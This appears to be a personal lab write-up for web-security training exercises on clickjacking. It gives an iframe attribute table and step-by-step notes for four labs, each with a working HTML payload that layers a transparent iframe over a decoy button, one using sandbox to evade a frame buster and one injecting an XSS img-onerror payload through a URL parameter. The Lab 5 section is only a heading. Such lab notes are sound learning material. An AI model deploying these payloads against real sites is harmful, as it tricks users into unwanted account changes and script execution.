**Exploit Code**
**Essential Attributes**

**allow**	 	**Specifies a feature policy for the** <iframe>
**allowfullscreen**	**true/false	Set to true if the <iframe> can activate fullscreen mode by calling the requestFullscreen() method**
**allowpaymentrequest**	**true/false	Set to true if a cross-origin <iframe> should be allowed to invoke the Payment Request API**
**height**	**pixels	Specifies the height of an <iframe>. Default height is 150 pixels**
**loading**	**eager/lazy	Specifies whether a browser should load an iframe immediately or to defer loading of iframes until some conditions are met**
**name**	**text	Specifies the name of an <iframe>**
**referrerpolicy**	**no-referrer/no-referrer-when-downgrade/origin/origin-when-cross-origin/same-origin/strict-origin-when-cross-origin/unsafe-url	Specifies which referrer information to send when fetching the iframe**
**sandbox**	**allow-forms/allow-pointer-lock/allow-popups/allow-same-origin/allow-scripts/allow-top-navigation	Enables an extra set of restrictions for the content in an <iframe>**
**src**	**URL	Specifies the address of the document to embed in the <iframe>**
**srcdoc**	**HTML_code	Specifies the HTML content of the page to show in the <iframe>**
**width**	**pixels	Specifies the width of an <iframe>. Default width is 300 pixels**

**---------------------------------------------------------------------------------------------------------------------------**
**Lab 1- Basic clickjacking with CSRF token protection**

**Steps**
**click on goto exploit Server**
**Generate the code and format as mentioned below**
**after  then send the exploit to victim by clicking on deliver to victime button**

<style>
iframe {
        position:relative;
        width:1135;
        height:600;
        opacity:0.001;
        z-index: 2;
    }
p {
        position:absolute;
        top:500;
        left:100;
        z-index: 1;
}
</style>
<p>Click Me</p>
<iframe src=https://0a3e00e0048e06f8806f85e800d50021.web-security-academy.net/my-account></iframe>

**---------------------------------------------------------------------------------------------------------------------------**
**Lab 2 - Clickjacking with form input data prefilled from a URL parameter**

**Steps**
**click on goto exploit Server**
**Generate the code and format as mentioned below and add a parameter email=<email.com>**
**after then send the exploit to victim by clicking on deliver to victime button**

<style>
iframe {
        position:relative;
        width:1135;
        height:600;
        opacity:0.0001;
        z-index: 2;
    }
p {
        position:absolute;
        top:450;
        left:80;
        z-index: 1;
}
</style>
<p>Click Me</p>
<iframe src="https://0a510088037b3971808949be00ad0056.web-security-academy.net/my-account?email=hellotest@gmail.com"></iframe>

**---------------------------------------------------------------------------------------------------------------------------**
**Lab 3 - Clickjacking with a frame buster script**
**Steps**
**click on goto exploit Server**
**Generate the code and format as mentioned below and add a parameter <iframe sandbox="allow-forms">**
**after then send the exploit to victim by clicking on deliver to victime button**

<style>
iframe {
        position:relative;
        width:1135;
        height:600;
        opacity:0.0001;
        z-index: 2;
    }
p {
        position:absolute;
        top:450;
        left:80;
        z-index: 1;
}
</style>
<p>Click Me</p>
<iframe sandbox="allow-forms" src="https://0a0200f4032854b383a23712003200cc.web-security-academy.net/my-account?email=hellotest@gmail.com"></iframe>

**---------------------------------------------------------------------------------------------------------------------------**
**Lab - 4  Exploiting clickjacking vulnerability to trigger DOM-based XSS**

**Steps**
**Click on submit feedback button fill the form and check for XSS reflected or not in the form**
**Passing the parameter as on name <img src=x onerrro=alert(1)> intercept the request in the burp and check the response**
**After then copy the parameter and paste it over url to fill the details automatically as mentioned below**
**https://0ac6009203ecf7a384c0e1c300fd00c4.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&email=yesy%40gmail.com&subject=sdfsdfsdf&message=sdfsfsdf#feedbackForm form # it will directed to submit button form**
**click on goto exploit Server**
**Copy the code and over-write the existing one into <iframe> tag after src**
**after then send the exploit to victim by clicking on deliver to victime button**

![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)
<style>
iframe {
        position:relative;
        width:1135;
        height:600;
        opacity:0.2;
        z-index: 2;
    }
p {
        position:absolute;
        top:520;
        left:80;
        z-index: 1;
}
</style>
<p>Click Me</p>
<iframe src="https://0ac6009203ecf7a384c0e1c300fd00c4.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dprint%28%29%3E&email=yesy%40gmail.com&subject=sdfsdfsdf&message=sdfsfsdf#feedbackForm">

**---------------------------------------------------------------------------------------------------------------------------**
**Lab - 5  Exploiting clickjacking vulnerability to trigger DOM-based XSS**

















